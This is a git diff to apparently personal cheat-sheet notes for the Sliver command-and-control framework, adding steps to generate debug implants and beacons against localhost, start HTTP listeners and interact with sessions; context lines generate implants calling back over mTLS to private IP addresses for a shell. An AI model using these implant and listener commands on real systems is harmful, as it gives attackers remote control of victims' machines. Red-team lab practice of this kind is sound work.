@@ -5,9 +5,26 @@
  sudo service sliver start
 
 # Usage:
-# Create a profile
+# Create a profile (Not neccessary) Proceed with  LOCALHOST Down below
 profiles new beacon -a amd64 -e -f elf/exe -m "mtls://192.168.43.1:9000" mtls
 profiles generate mtls
+
+# LocalHost Testing Implants
+
+generate -b localhost --os linux --skip-symbols --debug
+implants
+http
+jobs   # Then Execute implant in another terminal
+sessions
+use
+
+## After Testing Implant, Test Beacon
+generate beacon -b localhost --skip-symbols --debug -j 5 -S 15 --os linux
+jobs
+http # if not started
+beacons   # Then Execute on target in another terminal
+use     # select beacon
+interactive
 
 ## Linux
 generate --mtls 10.10.10.136:9000 --os linux --save shell
